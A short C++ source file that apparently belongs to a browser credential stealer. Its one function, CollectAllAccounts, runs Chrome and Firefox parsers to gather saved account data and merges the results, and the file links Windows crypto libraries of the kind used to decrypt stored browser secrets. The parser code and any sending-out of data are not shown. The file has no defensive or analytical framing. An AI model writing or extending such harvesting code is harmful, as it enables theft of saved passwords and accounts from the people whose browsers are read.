#include "BaseBrowser.h"
#include "ChromeParser.h"
#include "FireFoxParser.h"

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

List<AccountData> BaseBrowser::CollectAllAccounts()
{
    List<AccountData> ret;

    ChromeParser cParser;
    List<AccountData> chromeAccounts = cParser.CollectAccounts();

    FirefoxParser cParserFire;
    List<AccountData> firefoxAccounts = cParserFire.CollectAccounts();
    
    ret.insert(ret.end(), chromeAccounts.begin(), chromeAccounts.end());
    ret.insert(ret.end(), firefoxAccounts.begin(), firefoxAccounts.end());

    return ret;
}
